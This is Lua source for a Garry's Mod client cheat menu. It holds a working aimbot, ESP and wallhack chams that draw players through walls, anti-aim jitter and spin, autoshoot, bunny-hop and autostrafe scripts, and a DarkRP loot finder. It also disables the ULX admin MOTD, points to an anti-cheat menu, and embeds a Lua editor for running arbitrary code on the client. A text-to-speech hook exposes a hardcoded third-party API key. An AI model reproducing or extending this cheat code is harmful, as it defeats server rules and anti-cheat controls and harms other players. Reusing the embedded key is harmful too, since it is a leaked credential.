				pos = pMenu.PredictPos(v:GetBonePosition(v:LookupBone(bonee)))
			else
				pos = pMenu.PredictPos(v:GetBonePosition(v:LookupBone(AimbotPoints[pMenuVars.Sliders["Aimbot Bone"].value].bone)))
			end
			local tarAng = pMenu.GetAngleVector(curEye,pos);
			tarAng = Vector(tarAng.x,tarAng.y + 180,0);
			local dist = tarAng:Distance(curAng);
			if dist <= limit && dist < retDist && LocalPlayer():IsLineOfSightClear(pos) then
				ret = v;
				retDist = dist;
			end
		end
		return ret;
	end
	function pMenu.AAA(ply)
		local Angles = ply:EyeAngles()
		if pMenuVars.CheckBoxes[ply:SteamID().."Force Ang"] != nil && pMenuVars.CheckBoxes[ply:SteamID().."Force Ang"].value then
			Angles.p = math.NormalizeAngle( math.Clamp(Angles.p,-89,89) + pMenuVars.Sliders[ply:SteamID().."Force Pitch"].value)
			Angles.y = math.NormalizeAngle( math.NormalizeAngle(Angles.y) + pMenuVars.Sliders[ply:SteamID().."Force Yaw"].value)
		end
		ply:SetPoseParameter("aim_pitch", Angles.p);
		ply:SetPoseParameter("body_yaw", Angles.y);
		ply:SetPoseParameter("aim_yaw", 0);
		ply:InvalidateBoneCache();
		ply:SetRenderAngles(Angle(0, Angles.y, 0));
	end
	hook.Add("RenderScene","tes",function()
		for k,v in pairs(player.GetAll()) do
			if v == LocalPlayer() then
				continue;
			end
			pMenu.AAA(v)
		end
	end)
	function pMenu.DrawESP(ply)
		local boxcolor = Color(pMenuVars.Sliders["ESP BoxColor.r"].value,pMenuVars.Sliders["ESP BoxColor.g"].value,pMenuVars.Sliders["ESP BoxColor.b"].value,255)
		local textcolor = Color(pMenuVars.Sliders["ESP TextColor.r"].value,pMenuVars.Sliders["ESP TextColor.g"].value,pMenuVars.Sliders["ESP TextColor.b"].value,255)
		local left,right,top,bottom = pMenu.boundingbox(ply)
		if pMenuVars.CheckBoxes["ESP BoundingBox"].value then
			surface.SetDrawColor(boxcolor);
			surface.DrawOutlinedRect(left + 1,top + 1, (right - left) + 1,(bottom - top) + 1)
		end
		if pMenuVars.CheckBoxes["ESP HealthBar"].value then
			surface.SetDrawColor(0,0,0,255);
			surface.DrawRect(left - 5,top - 1 + 2,4, (bottom - top) / 100 * ply:Health() + 2)
			surface.SetDrawColor(255,0,0,255);
			surface.DrawRect(left - 4,top + 2,2, (bottom - top) / 100 * ply:Health())
		end
	
		if (pMenuVars.CheckBoxes["ESP Name"].value) then
			draw.SimpleText(ply:Nick(),"Font L2",left + (right - left) / 2,top - 5,textcolor,TEXT_ALIGN_CENTER,TEXT_ALIGN_BOTTOM)
		end
		if (pMenuVars.CheckBoxes["ESP Position"].value) then
			local pos = ply:GetPos();
			draw.SimpleText("POS = ".."X: "..math.floor(pos.x).." Y: "..math.floor(pos.y).." Z: "..math.floor(pos.z),"Font L2",right + 3,top,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
		end
		if (pMenuVars.CheckBoxes["ESP Angles"].value) then
			local pos = ply:EyeAngles();
			draw.SimpleText("ANG.X: "..(ply:EyeAngles().p),"Font L2",right + 3,top + 12,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
			draw.SimpleText("ANG.Y: "..(ply:EyeAngles().y),"Font L2",right + 3,top + 24,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
			draw.SimpleText("ANG.Z: "..(ply:EyeAngles().r),"Font L2",right + 3,top + 36,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
		end
		if (pMenuVars.CheckBoxes["ESP Traceline"].value) then
			local eyes = (ply:EyePos() + ply:EyeAngles():Forward() * pMenuVars.Sliders["ESP Traceline Distance"].value):ToScreen();
			local eye = ply:EyePos():ToScreen();
	
			surface.SetDrawColor(255,255,255,255)
			if eye.visible && eyes.visible then
				surface.DrawLine(eyes.x,eyes.y,eye.x,eye.y)
			end
		end
	end
	// pasted chams because l a z y 
	local chamsmat = CreateMaterial("a", "VertexLitGeneric", {
		["$ignorez"] = 1,
		["$model"] = 1,
		["$basetexture"] = "models/debug/debugwhite",
	})
	local chamsmat2 = CreateMaterial("@", "VertexLitGeneric", {
		["$ignorez"] = 0,
		["$model"] = 1,
		["$basetexture"] = "models/debug/debugwhite",
	})
	function pMenu.Chams(v)
		local ChamVis = Color(pMenuVars.Sliders["ESP ChamVisColor.r"].value,pMenuVars.Sliders["ESP ChamVisColor.g"].value,pMenuVars.Sliders["ESP ChamVisColor.b"].value,255)
		local ChamNVis = Color(pMenuVars.Sliders["ESP ChamNVisColor.r"].value,pMenuVars.Sliders["ESP ChamNVisColor.g"].value,pMenuVars.Sliders["ESP ChamNVisColor.b"].value,255)
		cam.Start3D()
			if v:IsValid() then
				if pMenuVars.CheckBoxes["ESP XQZ"].value then
					render.MaterialOverride(chamsmat)
					render.SetColorModulation(ChamNVis.r/ 255, ChamNVis.g/255, ChamNVis.b/255)
					v:DrawModel()
				end
	
				render.SetColorModulation(ChamVis.r / 255, ChamVis.g/ 255, ChamVis.b/ 255) // vis
				render.MaterialOverride(chamsmat2)
				v:DrawModel()
			end
			local wep = v:GetActiveWeapon()
			local wep = v:GetActiveWeapon()
			if wep:IsValid() then
				if pMenuVars.CheckBoxes["ESP WeaponCham"].value then
					render.MaterialOverride(chamsmat)
					render.SetColorModulation(255/255, 0/255, 0/255, 255)
					wep:DrawModel()
					render.SetColorModulation(255/255, 255/255, 0/255, 255)
					render.MaterialOverride(chamsmat2)
					wep:DrawModel()
				end
			end
		cam.End3D()
	end
	function pMenu.bhop(pcmd)
		if (!LocalPlayer():IsOnGround() && !LocalPlayer():IsTyping() && pcmd:KeyDown(IN_JUMP)) then
			pcmd:RemoveKey(IN_JUMP)
		end
	end
	function pMenu.autostrafe(pcmd)
		if !(LocalPlayer():IsOnGround()) && input.IsKeyDown(KEY_SPACE) then
			if(pcmd:GetMouseX() > 1 or pcmd:GetMouseX() < -1) then
				if(pcmd:GetMouseX() < 0) then
					pcmd:SetSideMove(-400)
				else
					pcmd:SetSideMove(400)
				end
			else
				pcmd:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D())
				pcmd:SetSideMove((pcmd:CommandNumber() % 2 == 0) and 400 or -400)
			end
		end
	end
	function pMenu.ToggleMenu()
		if Frame == NULL then
			pMenu.Menu()
		else
			Frame:Close()
			Frame = NULL
		end
	end
	function pMenu.FixMovement(pCmd,fa,angles)
		local vec = Vector(pCmd:GetForwardMove(pCmd), pCmd:GetSideMove(), 0)
		local vel = math.sqrt(vec.x*vec.x + vec.y*vec.y)
		local mang = vec:Angle()
		local yaw = angles.y - fa.y + mang.y
		if (((angles.p+90)%360) > 180) then
			yaw = 180 - yaw
		end
		yaw = ((yaw + 180)%360)-180
		pCmd:SetForwardMove(math.cos(math.rad(yaw)) * vel)
		pCmd:SetSideMove(math.sin(math.rad(yaw)) * vel)
	end
	function pMenu.Shoot(pcmd)
		if(LocalPlayer():KeyDown(1)) then
			pcmd:SetButtons(bit.band( pcmd:GetButtons(), bit.bnot( 1 ) ) );
		else
			pcmd:SetButtons(bit.bor( pcmd:GetButtons(), 1 ) );
		end
	end
	hook.Add("RenderScreenspaceEffects","hkRenderScreenspaceEffects",function()
		if (pMenuVars.CheckBoxes["ESP Chams"] != nil && pMenuVars.CheckBoxes["ESP Chams"].value && pMenuVars.CheckBoxes["ESP"] != nil && pMenuVars.CheckBoxes["ESP"].value) then
			for k,v in pairs(player.GetAll()) do
				if v != LocalPlayer() && v:Alive() && !v:IsDormant() && v:Health() > 1 then
					pMenu.Chams(v);
				end
			end
		end
	end)
	
	hook.Add("PreDrawHalos","hkPreDrawHalos",function()
		if (pMenuVars.CheckBoxes["ESP Glow"] != nil && pMenuVars.CheckBoxes["ESP Glow"].value && pMenuVars.CheckBoxes["ESP"] != nil && pMenuVars.CheckBoxes["ESP"].value) then
			local tab = {}
			for k,v in pairs(player.GetAll()) do
				if v != LocalPlayer() &&  v:Alive() then
					tab[k] = v;
				end
			end
			halo.Add( tab, Color( 255, 255, 255 ), 2, 2, 4,true,true )
		end
	end)
	hook.Add("HUDPaint","hkHUDPaint",function()
		for k,v in pairs(player.GetAll()) do
			if v != LocalPlayer() &&  v:Alive() then
				if pMenuVars.CheckBoxes["ESP"] != nil && pMenuVars.CheckBoxes["ESP"].value then
					pMenu.DrawESP(v)
				end
			end
		end
		if pMenuVars.CheckBoxes["Aibmot Show fov circle"] != nil && pMenuVars.CheckBoxes["Aibmot Show fov circle"].value then
			local End = (ScrW() / (LocalPlayer():GetFOV() + 60) ) * pMenuVars.Sliders["Aimbot FOV"].value;
			pMenu.DrawCircle(ScrW() / 2,ScrH() / 2, End, 70,Color(pMenuVars.Sliders["Aimbot Circle.r"].value,pMenuVars.Sliders["Aimbot Circle.g"].value,pMenuVars.Sliders["Aimbot Circle.b"].value,pMenuVars.Sliders["Aimbot Circle.a"].value))
		end
	end)
	local View = Angle();
	hook.Add("CalcView","hkCalcView",function(ply, pos1, angles, fov)
		if (pMenuVars.CheckBoxes["HvH Enable"] != nil && pMenuVars.CheckBoxes["HvH Enable"].value) then
			local view = {}
			local ang = View
			view.angles = View
			local angfwd = ang:Forward();
			local distance = pMenuVars.Sliders["MISC Thirdperson Distance"].value
			local endpoz = Vector(pos1.x - distance * angfwd.x,pos1.y - distance * angfwd.y, pos1.z - distance * angfwd.z);
			local tracelines = util.TraceLine({start = LocalPlayer():EyePos(),endpos  = endpoz, filter = LocalPlayer()})
	
			view.origin = tracelines.HitPos
			view.drawviewer = true;
			return view;
		end
		if pMenuVars.CheckBoxes["MISC Thirdperson"] != nil && pMenuVars.CheckBoxes["MISC Thirdperson"].value then
			local view = {}
			local ang = angles
			view.angles = ang
			local angfwd = ang:Forward();
			local distance = pMenuVars.Sliders["MISC Thirdperson Distance"].value
			local endpoz = Vector(pos1.x - distance * angfwd.x,pos1.y - distance * angfwd.y, pos1.z - distance * angfwd.z);
			local tracelines = util.TraceLine({start = LocalPlayer():EyePos(),endpos  = endpoz, filter = LocalPlayer()})
	
			view.origin = tracelines.HitPos
			view.drawviewer = true;
			return view;
		end
	end)
	local t = 0;
	local jitter = false;
	local AShoot = false;
	hook.Add("CreateMove","hkCreateMove",function(pCmd)
		if pMenuVars.CheckBoxes["MISC Bhop"] != nil && pMenuVars.CheckBoxes["MISC Bhop"].value then
			pMenu.bhop(pCmd)
		end
		if pMenuVars.CheckBoxes["MISC Autostrafe"] != nil && pMenuVars.CheckBoxes["MISC Autostrafe"].value then
			pMenu.autostrafe(pCmd)
		end
		if pMenuVars.CheckBoxes["Aibmot Enable"] != nil && pMenuVars.CheckBoxes["Aibmot Enable"].value then
			if input.IsKeyDown(pMenuVars.Sliders["Aimbot Key"].value) then
				local nearest = pMenu.ClosestEntToCross(pMenuVars.Sliders["Aimbot FOV"].value,pCmd,AimbotPoints[pMenuVars.Sliders["Aimbot Bone"].value].bone,pCmd:GetViewAngles());
				if nearest != NULL then 
					local Eye = LocalPlayer():EyePos();
					local target = nearest:GetBonePosition(nearest:LookupBone(AimbotPoints[pMenuVars.Sliders["Aimbot Bone"].value].bone))
					local End = Angle();
					if pMenuVars.CheckBoxes["Aibmot Smooth"].value then
						End = pMenu.SmoothAngle(pMenu.GetAngle(Eye,target),pCmd:GetViewAngles(),pMenuVars.Sliders["Aimbot Smooth AMT"].value);
					else
						End = pMenu.GetAngle(Eye,target)
					end
					pCmd:SetViewAngles(End)
				end
			end
		end
		if input.IsKeyDown(KEY_DELETE) then
			t = t + 1
			if t == 1 then
				pMenu.ToggleMenu()
			end
		else
			t = 0;
		end
		local fwdmouse = Vector(pCmd:GetMouseX(),pCmd:GetMouseY(),0)
		View.y = math.NormalizeAngle(View.y + ( ((fwdmouse.x / 250) * GetConVar("sensitivity"):GetInt() )* -1) );
		View.x = math.Clamp(View.x + ( ((fwdmouse.y / 250) * GetConVar("sensitivity"):GetInt() )),-89,89 );
		View:Normalize()
		if (pMenuVars.CheckBoxes["HvH Enable"] != nil && pMenuVars.CheckBoxes["HvH Enable"].value) then
			local CurAngles = pCmd:GetViewAngles()
			local Anglez = Angle(View.x,View.y,0);
			if (pMenuVars.CheckBoxes["HvH Antiaim"].value) then
				Anglez = Angle(pMenuVars.Sliders["HvH Pitch"].value,pMenuVars.Sliders["HvH Yaw"].value,0);
				local style = pMenuVars.Sliders["HvH Style"].value;
				if style == 1 then
					jitter = !jitter;
					if jitter then
						Anglez.y = math.NormalizeAngle(CurAngles.y + Anglez.y + 100);
					else
						Anglez.y = math.NormalizeAngle(CurAngles.y + Anglez.y + 10);
					end
				elseif style == 2 then
					Anglez.y = math.NormalizeAngle(CurAngles.y + (engine.TickInterval() * pMenuVars.Sliders["HvH Spin Speed"].value));
				elseif style == 3 then
					local rand = pMenuVars.Sliders["HvH randomY"].value;
					Anglez.y = math.NormalizeAngle(CurAngles.y + Anglez.y + math.random(rand * -1,rand));
				elseif style == 4 then
					local ent = pMenu.ClosestEntToCross(720,pCmd,"ValveBiped.Bip01_Head1",View)
					if ent == NULL then
						Anglez.y = math.NormalizeAngle(Anglez.y + View.y);
					else
						local poz = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1"));
						local End = pMenu.GetAngle(LocalPlayer():EyePos(),poz);
						Anglez.y = math.NormalizeAngle(End.y + Anglez.y);
					end
				elseif style == 5 then
					Anglez.y = math.NormalizeAngle(Anglez.y);
				elseif style == 6 then
					Anglez.y = math.NormalizeAngle(View.y + Anglez.y);
				end
			end
			if pMenuVars.CheckBoxes["HvH Autoshoot"].value || input.IsKeyDown(pMenuVars.Sliders["Aimbot Key"].value)  then
				AShoot = !AShoot;
				if AShoot then
					local ent = pMenu.ClosestEntToCross(720,pCmd,"ValveBiped.Bip01_Head1",View);
					if ent != NULL then
						local poz = Vector(0,0,0);
						if pMenuVars.CheckBoxes[ent:SteamID().."Baim"] != nil && pMenuVars.CheckBoxes[ent:SteamID().."Baim"].value then
							local center = ent:OBBCenter()
							poz = ent:GetPos() + center;
						else
							poz = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1"));
						end
						local End = pMenu.GetAngle(LocalPlayer():EyePos(),poz);
						Anglez.x = math.Clamp(End.x,-89,89)
						Anglez.y = math.NormalizeAngle(End.y);
						pMenu.Shoot(pCmd)
					end
				end
			end
			if Anglez != nil then
				pCmd:SetViewAngles(Anglez)
			end
			pMenu.FixMovement(pCmd,View,pCmd:GetViewAngles())
		end
	end)
	hook.Add( "OnPlayerChat", "hkOnPlayerChat", function( ply, strText, bTeam, bDead )
		if pMenuVars.CheckBoxes["MISC Text to speech is fucking aids"] != nil && pMenuVars.CheckBoxes["MISC Text to speech is fucking aids"].value then
			strText = string.lower( strText )
			local player = ply:Nick()
	
			local text = player.." said "..strText;
			sound.PlayURL("https://api.ispeech.org/api/rest?apikey=34b06ef0ba220c09a817fe7924575123&action=convert&voice=usenglishmale&speed=1&pitch=100&text="..text,"mono",function(snd)
				if IsValid(snd) then
					snd:Play()
					snd:SetVolume(1)
				end
			end)
		end
	end)
	concommand.Add("Defqon_bigmenu",pMenu.ToggleMenu)
	

	
	 CreateClientConVar( "gravko_esp", "0", true, true)
	local function gravesp2()
	if tobool( GetConVarNumber( "gravko_esp" ) ) then
	for k, v in pairs( player.GetAll() ) do
	local pos = ( v:GetShootPos() + Vector( 0, 0, 30) ):ToScreen()
	draw.SimpleTextOutlined( v:Nick(), "Default", pos.x + 40, pos.y + 15, Color(0,255,0), 1, 1, 1, Color( 0, 0, 0, 255 ) )
	local hp = "HP: "..v:Health()
	local teamcol = team.GetColor(v:Team())
	local wep2 = v:GetActiveWeapon()
	local rank1 = "["..v:GetUserGroup().."]"
	local friend = v:GetFriendStatus()
	local targetDistance = math.floor((LocalPlayer():GetPos():Distance( v:GetPos()))/40)
	local targetDistance3 = math.floor((LocalPlayer():GetPos():Distance( v:GetPos()))/100000)
	
	//draw.SimpleTextOutlined( targetDistance, "Default", pos.x + 40, pos.y + 30, Color(255,160,0), 1, 1, 1, Color( 0, 0, 0, 255 ) )
	
	draw.SimpleTextOutlined( hp, "Default", pos.x + 40, pos.y + 27, Color(255,160,0), 1, 1, 1, Color( 0, 0, 0, 255 ) )
	
	
	draw.SimpleTextOutlined( rank1, "Default", pos.x + 40, pos.y + 5, Color(255,0,0), 1, 1, 1, Color( 0, 0, 0, 255 ) )
	
	//draw.SimpleTextOutlined( friend, "Default", pos.x + 40, pos.y + 20, Color(0,150,255), 1, 1, 1, Color( 0, 0, 0, 255 ) )
	
	local boxpos2 = ( v:GetShootPos() + Vector( 0, 0, 30) ):ToScreen()
	draw.RoundedBox(5, pos.x - 6, pos.y + targetDistance3, 11, 11, Color(teamcol.r,teamcol.g,teamcol.b, 255), 1)
	end
	end
	end
	hook.Add( "HUDPaint", "esp2", gravesp2)
	-------------------------------------------------------- */
	showunk = CreateClientConVar("gmhax_ShowUnknownEntity", "1", true, true)
	
	shouldloot = CreateClientConVar("gmhax_showdarkrploot2", "0", true, true)
	hook.Add("HUDPaint", "findtherpshit", function()
			if shouldloot:GetBool() then
			for k, v in pairs(ents.GetAll()) do
			local mDistance = math.floor((LocalPlayer():GetPos():Distance( v:GetPos()))/40)
			Pos = v:GetPos():ToScreen()
			if not string.find(v:GetClass(), "prop") and not string.find(v:GetClass(), "func") and not string.find(v:GetClass(), "class") and not string.find(v:GetClass(), "env") and not string.find(v:GetClass(), "player") and not string.find(v:GetClass(), "view") and not string.find(v:GetClass(), "world") and not string.find(v:GetClass(), "weapon_") and not string.find(v:GetClass(), "gmod") and not string.find(v:GetClass(), "beam") and not string.find(v:GetClass(), "manipulate") and not string.find(v:GetClass(), "sent") and not string.find(v:GetClass(), "m9k") and not string.find(v:GetClass(), "gun") and not string.find(v:GetClass(), "pocket") and not string.find(v:GetClass(), "vending") and not string.find(v:GetClass(), "npc") and not string.find(v:GetClass(), "sammy") and not string.find(v:GetClass(), "stunstick") and not string.find(v:GetClass(), "unarrest_stick") and not string.find(v:GetClass(), "arrest_stick") and not string.find(v:GetClass(), "door") and not string.find(v:GetClass(), "keys") and not string.find(v:GetClass(), "keypad") and not string.find(v:GetClass(), "lock") and not string.find(v:GetClass(), "chat") and not string.find(v:GetClass(), "gmt") and not string.find(v:GetClass(), "weaponchecker") and not string.find(v:GetClass(), "Keypad") and not string.find(v:GetClass(), "med_") and not string.find(v:GetClass(), "darkrp") and not string.find(v:GetClass(), "swep") and not string.find(v:GetClass(), "fas2") and not string.find(v:GetClass(), "ent_spike") and not string.find(v:GetClass(), "car") and not string.find(v:GetClass(), "fuel") and not string.find(v:GetClass(), "taser") and not string.find(v:GetClass(), "point") and not string.find(v:GetClass(), "hook") and not string.find(v:GetClass(), "tv") and not string.find(v:GetClass(), "newspaper") and not string.find(v:GetClass(), "atm") and not string.find(v:GetClass(), "handcuffs") and not string.find(v:GetClass(), "payphone") and not string.find(v:GetClass(), "wire") then
									if string.find(v:GetClass(), "printer") then
										   // draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
										   // draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 100, 40, Color(0,0,0,120), 1)
											draw.SimpleTextOutlined("Принтер", "Default", Pos.x + 25, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
											draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 54, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
											draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
											elseif v:GetClass() == "spawned_shipment" then
										   // draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
										   // draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 100, 40, Color(0,0,0,120), 1)
											 draw.SimpleTextOutlined("Ящики", "Default", Pos.x + 30, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
											draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 55, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
											draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
											elseif string.find(v:GetClass(), "durgz") then
										  //  draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
										  //  draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 95, 40, Color(0,0,0,120), 1)
											 draw.SimpleTextOutlined("Наркота", "Default", Pos.x + 23, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
											draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 50, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
											draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
											elseif v:GetClass() == "spawned_weapon" then
											//draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
										  //  draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 95, 40, Color(0,0,0,120), 1)
											draw.SimpleTextOutlined("Оружие", "Default", Pos.x + 25, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
											draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 50, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
											draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
											
											elseif v:GetClass() == "spawned_money" then
										   // draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
										  //  draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 95, 40, Color(0,0,0,120), 1)
											draw.SimpleTextOutlined("Деньги", "Default", Pos.x + 25, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
											draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 50, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
											draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
											else
											if showunk:GetBool() then
										   // draw.RoundedBox(5, Pos.x - 6, Pos.y - 30, 11, 11, Color(0, 0, 255, 255), 1)
										   // draw.RoundedBox(6, Pos.x + 5, Pos.y - 38, 95, 40, Color(0,0,0,120), 1)
											//draw.SimpleTextOutlined("Неизвестное энтити", "Default", Pos.x + 47, Pos.y - 30, Color(0,255,0), 1, 1, 1, Color(0,0,0,255))
											draw.SimpleTextOutlined(v:GetClass(), "Default", Pos.x + 53, Pos.y - 20, Color(255,170,0), 1, 1, 1, Color(0,0,0,255))
											draw.SimpleTextOutlined("["..mDistance.."]", "Default", Pos.x + 18, Pos.y - 8, Color(255,0,0), 1, 1, 1, Color(0,0,0,255))
											end
											
									end
							end
					end    
			end
	end)
	---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	local ulxflood = false
	local netKey = ""
	local Defqon = nil 
	if ulx then ulx.showMotdMenu = function() end end
	local iZNX = {}
	iZNX.memory = {}
	local grad = Material( "gui/gradient" )
	local upgrad = Material( "gui/gradient_up" )
	local downgrad = Material( "gui/gradient_down" )
	local ctext = chat.AddText
	surface.CreateFont("HUDLogo2",{size = 18, weight = 100, antialias = 0})
	
	timer.Create("timerversionchecker",20,1,function()
	hook.Remove("HUDPaint", "HudVersionChecker")
	end)
	hook.Add("HUDPaint", "HudVersionChecker", function()
	draw.SimpleTextOutlined( "Привет "..steamworks.GetPlayerName( LocalPlayer():SteamID64() )..", вы используете последнюю версию меню", "HUDLogo2", ScrW()/2 + math.sin(RealTime()) * ScrW() / 85, ScrH()/30, Color( 99, 210, 214, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255) )
	end)
	function playSound(url)
	
		sound.PlayURL(url, '', function( station ) 
	
			if ( IsValid( station ) ) then
	
			station:SetPos( LocalPlayer():GetPos() )
			station:Play()
	
			end
		end)
	
	end
	playSound("")
	function luaview()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.Menu:Remove()
	vgui.Create("chmluaviewer"):MakePopup()
	end
	concommand.Add("Defqon_luaview", function() vgui.Create("chmluaviewer"):MakePopup() end)
	
	function bigmenu()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.Menu:Remove()
	RunConsoleCommand( "Defqon_bigmenu" )
	end
	
	function anticheats()
	surface.PlaySound("garrysmod/ui_click.wav")
	iZNX.Menu:Remove()
	RunConsoleCommand( "Defqon_anticheats")
	end
	----------------------------------------------------------------------------------------------------------------------------------------------------------------
			function editor()
			local PANEL = {}
	
		PANEL.URL = "http://metastruct.github.io/lua_editor/"
		PANEL.COMPILE = "C"
	
		local javascript_escape_replacements =
		{
			["\\"] = "\\\\",
			["\0"] = "\\0" ,
			["\b"] = "\\b" ,
			["\t"] = "\\t" ,
			["\n"] = "\\n" ,
			["\v"] = "\\v" ,
			["\f"] = "\\f" ,
			["\r"] = "\\r" ,
			["\""] = "\\\"",
			["\'"] = "\\\'",
		}
	
		function PANEL:Init()
			self.Code = ""
	
			self.ErrorPanel = self:Add("DButton")
			self.ErrorPanel:SetFont('BudgetLabel')
			self.ErrorPanel:SetTextColor(Color(255,255,255))
			self.ErrorPanel:SetText("")
			self.ErrorPanel:SetTall(0)
			self.ErrorPanel.DoClick = function()
				self:GotoErrorLine()
			end
			self.ErrorPanel.DoRightClick = function(self)
				SetClipboardText(self:GetText())
			end
			self.ErrorPanel.Paint = function(self,w,h)
				surface.SetDrawColor(255,50,50)
				surface.DrawRect(0,0,w,h)
			end
	
			self:StartHTML()
		end
	
		function PANEL:Think()
			if self.NextValidate && self.NextValidate < CurTime() then
				self:ValidateCode()
			end
		end
	
		function PANEL:StartHTML()
			self.HTML = self:Add("DHTML")
	
			self:AddJavascriptCallback("OnCode")
			self:AddJavascriptCallback("OnLog")
	
			self.HTML:OpenURL(self.URL)
			
			self.HTML:RequestFocus()
		end
	
		function PANEL:ReloadHTML()
			self.HTML:OpenURL(self.URL)
		end
	
		function PANEL:JavascriptSafe(str)
			str = str:gsub(".",javascript_escape_replacements)
			str = str:gsub("\226\128\168","\\\226\128\168")
			str = str:gsub("\226\128\169","\\\226\128\169")
			return str
		end
	
		function PANEL:CallJS(JS)
			self.HTML:Call(JS)
		end
	
		function PANEL:AddJavascriptCallback(name)
			local func = self[name]
	
			self.HTML:AddFunction("gmodinterface",name,function(...)
				func(self,HTML,...)
			end)
		end
	
		function PANEL:OnCode(_,code)
			self.NextValidate = CurTime() + 0.2
			self.Code = code
		end
	
		function PANEL:OnLog(_,...)
			Msg("Editor: ")
			print(...)
		end
	
		function PANEL:SetCode(code)
			self.Code = code
			self:CallJS('SetContent("' .. self:JavascriptSafe(code) .. '");')
		end
	
		function PANEL:GetCode()
			return 'local me=Entity('..LocalPlayer():EntIndex()..') local trace=me:GetEyeTrace() local this,there=trace.Entity,trace.HitPos '..self.Code
		end
	
		function PANEL:SetGutterError(errline,errstr)
			self:CallJS("SetErr('" .. errline .. "','" .. self:JavascriptSafe(errstr) .. "')")
		end
	
		function PANEL:GotoLine(num)
			self:CallJS("GotoLine('" .. num .. "')")
		end
	
		function PANEL:ClearGutter()
			self:CallJS("ClearErr()")
		end
	
		function PANEL:GotoErrorLine()
			self:GotoLine(self.ErrorLine || 1)
		end
	
		function PANEL:SetError(err)
			if !IsValid(self.HTML) then
				self.ErrorPanel:SetText("")
				self:ClearGutter()
				return
			end
	
			local tall = 0
	
			if err then
				local line,err = string.match(err,self.COMPILE .. ":(%d*):(.+)")
	
				if line && err then
					tall = 20
	
					self.ErrorPanel:SetText((line && err) && ("Line " .. line .. ": " .. err) || err || "")
					self.ErrorLine = tonumber(string.match(err," at line (%d)%)") || line) || 1
					self:SetGutterError(self.ErrorLine,err)
				end
			else
				self.ErrorPanel:SetText("")
				self:ClearGutter()
			end
	
			local wide = self:GetWide()
			local tallm = self:GetTall()
	
			self.ErrorPanel:SetPos(0,tallm - tall)
			self.ErrorPanel:SetSize(wide,tall)
			self.HTML:SetSize(wide,tallm - tall)
		end
	
		function PANEL:ValidateCode() 
			local time = SysTime()
			local code = self:GetCode()
	
			self.NextValidate = nil
	
			if !code || code == "" then
				self:SetError()
				return
			end
	
			local errormsg = CompileString(code,self.COMPILE,false)
			time = SysTime() - time
	
			if type(errormsg) == "string" then
				self:SetError(errormsg)
			elseif time > 0.25 then
				self:SetError("Compiling took too long. (" .. math.Round(time * 1000) .. ")")
			else
				self:SetError()
			end
		end
	
		function PANEL:PerformLayout(w,h)
			local tall = self.ErrorPanel:GetTall()
	
			self.ErrorPanel:SetPos(0,h - tall)
			self.ErrorPanel:SetSize(w,tall)
	
			self.HTML:SetSize(w,h - tall)
		end
	
	
		vgui.Register("lua_editor",PANEL,"EditablePanel")
	
		local menu = vgui.Create('DFrame')
		menu:SetSize(ScrW()/2,ScrH()/2)
		menu:SetTitle('                                                                                                                                   Lua Code | Run On Self')
		menu:Center()
		menu:SetSizable(true)
		menu:MakePopup()
		menu:ShowCloseButton(false)
		menu.Paint = function(self,w,h)
			surface.SetDrawColor(30,30,30)
			surface.DrawRect(0, 0, w, 25)
			
			surface.SetDrawColor(0,0,0)
			surface.DrawRect(0, 25, w, h-25)
		end
	
		local clos = vgui.Create("DButton", menu)
